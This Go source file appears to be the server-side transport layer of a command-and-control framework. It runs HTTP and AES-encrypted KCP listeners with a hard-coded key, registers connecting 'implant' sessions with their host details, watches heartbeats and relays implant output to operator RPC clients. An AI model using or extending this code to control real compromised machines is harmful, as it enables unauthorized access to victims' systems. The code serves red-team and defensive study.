package transport

import (
	"bytes"
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"github.com/smallnest/rpcx/server"
	"github.com/xtaci/kcp-go"
	"golang.org/x/crypto/pbkdf2"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"sabathe/implant/config"
	"sabathe/server/goroutes"
	"sabathe/server/mthod"
	"time"
)

var RpcServer *server.Server

type httpSend struct {
	Conn net.Conn
}

var UsingConn net.Conn

func HttpListener(address string) (*http.Server, error) {
	var err error
	//route := gin.Default()
	s := http.Server{
		Addr: address,
		//Handler: route,
	}
	if mthod.IsOpen(address) {
		go func() {
			_ = s.ListenAndServe()
		}()
	} else {
		return nil, fmt.Errorf("the http address is occupied")
	}
	//http.ListenAndServe(address,route)
	//err = route.Run(address)
	log.Println("start http listener", address)
	return &s, err
}

func KcpListener(address string, rpc net.Conn, listenerId int) (listen *kcp.Listener, err error) {
	key := pbkdf2.Key([]byte("@SDW*##@SZZCSDGDSA2"), []byte("salt"), 1024, 32, sha1.New) // 新建一个加密算法
	block, _ := kcp.NewAESBlockCrypt(key)
	listen, err = kcp.ListenWithOptions(address, block, 10, 3)
	if err != nil {
		log.Println(err)
		return nil, err
	}
	log.Println("start kcp listener", address, listen)
	go func(listener *kcp.Listener, rpc net.Conn) {
		for {
			conn, err := listener.AcceptKCP()
			if err != nil {
				log.Println("accept error", err)
				return
			}
			// add a session
			_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			data := mthod.UnKcpPackage(conn)
			if len(data) == 0 {
				continue
			}
			var systems config.Implant
			err = json.Unmarshal(data, &systems)
			//fmt.Println(err)
			if err != nil {
				log.Println("unmarshal failed", err)
				continue
			}
			var id = goroutes.NextSessionID()
			goroutes.Sessions.Add(&goroutes.Session{
				SessionID:   id,
				Name:        systems.AgentId,
				Description: systems.Platform,
				Implant: goroutes.SessionType{
					ImplantType:        systems.Protocol,
					ImplantUser:        systems.UserName,
					ImplantResponseURL: systems.ResponseUrl,
					KcpConn:            conn,
				},
				Debug: false,
			})
			// return a msg to rpc client
			go NewHttpPath(systems.AgentId, rpc)
			go KcpHandleConnection(conn, id)
			for _,c := range RpcServer.ActiveClientConn(){
				log.Println("new session connect", conn.RemoteAddr())
				err = RpcServer.SendMessage(c, "session_get", "session_method", nil, []byte(fmt.Sprintf("😁 new session from %v", conn.RemoteAddr())))
				if err != nil {
					return
				}
			}
		}
	}(listen, rpc)
	return listen, err
}

func KcpHandleConnection(conn *kcp.UDPSession, id int) {
	_ = conn.SetReadDeadline(time.Now().Add(time.Duration(15) * time.Second))
	var beat = make(chan bool, 1)
	//ticker := time.NewTicker(10 * time.Second)
	go func(chan bool) {
		for {
			var reply = make([]byte, 512)
			_, _ = conn.Read(reply)
			if bytes.Contains(reply, []byte("implant-beat")) {
				beat <- true
			}
		}
	}(beat)
HEARTBEAT:
	for {
		select {
		case <-beat:
			continue
		case <-time.After(10 * time.Second):
			log.Println("lost session connect", conn.RemoteAddr())
			s := goroutes.Sessions.Get(id)
			if s != nil {
				_ = conn.Close()
				goroutes.Sessions.Remove(s)
				for _,c := range RpcServer.ActiveClientConn(){
					err := RpcServer.SendMessage(c, "session_get", "session_method", nil, []byte(fmt.Sprintf("😭 lost a session from %v id %v", conn.RemoteAddr(), id)))
					if err != nil {
						break HEARTBEAT
					}
				}
			}
			break HEARTBEAT
		}
	}
}

func (h *httpSend) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	rs, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(fmt.Sprintf("%v", string(rs)))
	var resp config.Response
	err = json.Unmarshal(rs, &resp)
	if err != nil {
		return
	}
	//for _,c := range RpcServer.ActiveClientConn() {
	if UsingConn != nil {
		_ = RpcServer.SendMessage(UsingConn, "session_get", "session_method", nil, []byte(fmt.Sprintf("%v", string(resp.Body))))
		if err != nil {
			return
		}
	}
	//}
}

func NewHttpPath(path string, rpc net.Conn) {
	http.Handle("/"+path, &httpSend{Conn: rpc})
	log.Println(fmt.Sprintf("HTTP:%v", path))
	//fmt.Println(console.Clearln+"[+] new http path", path)
}
